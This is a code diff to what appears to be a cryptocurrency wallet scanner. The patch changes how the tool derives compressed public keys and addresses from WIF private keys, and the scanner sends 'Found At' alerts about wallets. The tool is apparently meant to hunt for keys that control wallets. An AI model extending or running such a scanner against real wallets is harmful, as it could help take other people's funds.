@@ -216,7 +216,7 @@ class AlertManager:
                 {"name": "🆔 Wallet ID", "value": str(wallet_id), "inline": True},
                 {"name": "🕐 Found At", "value": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": True}
             ],
-            "footer": {"text": f"Scanner v6.1 (Fixed WIF length) | {BLOCKCHAIN.upper()}"},
+            "footer": {"text": f"Scanner v6.2 (Manual compressed pubkey) | {BLOCKCHAIN.upper()}"},
             "timestamp": datetime.now(timezone.utc).isoformat()
         }
         async with aiohttp.ClientSession() as session:
@@ -337,7 +337,7 @@ class WalletScanner:
         else:
             return private_key_to_wif(raw, compressed=True)
 
-    # ---------- Derive addresses from private key (FIXED) ----------
+    # ---------- Derive addresses from private key (FIXED compressed pubkey) ----------
     def _derive_addresses_from_key_sync(self, private_key: str) -> List[str]:
         addresses = []
         if self.is_evm:
@@ -353,18 +353,22 @@ class WalletScanner:
         else:
             try:
                 decoded = base58.b58decode(private_key)
-                # Compressed WIF: 1 byte version + 32 bytes private + 1 byte compression flag + 4 bytes checksum = 38
-                # Uncompressed WIF: 1 byte version + 32 bytes private + 4 bytes checksum = 37
                 if len(decoded) == 38:  # compressed
-                    private_key_bytes = decoded[1:33]  # skip version, take 32 bytes
+                    private_key_bytes = decoded[1:33]
                 elif len(decoded) == 37:  # uncompressed
-                    private_key_bytes = decoded[1:33]  # skip version, take 32 bytes
+                    private_key_bytes = decoded[1:33]
                 else:
                     logger.error(f"Invalid WIF length: {len(decoded)}")
                     return []
                 priv = EthKeys.PrivateKey(private_key_bytes)
                 pub = priv.public_key
-                pubkey_bytes = pub.to_bytes(compressed=True)
+                # Get uncompressed public key (64 bytes: x then y)
+                uncompressed = pub.to_bytes()  # 64 bytes
+                x = uncompressed[:32]
+                y = uncompressed[32:]
+                # Determine prefix: 0x02 if y is even, 0x03 if odd
+                prefix = b'\x02' if int.from_bytes(y, 'big') % 2 == 0 else b'\x03'
+                pubkey_bytes = prefix + x  # 33 bytes compressed
                 for addr_func in [p2pkh_address, p2sh_segwit_address, native_segwit_address]:
                     addr = addr_func(pubkey_bytes)
                     if addr:
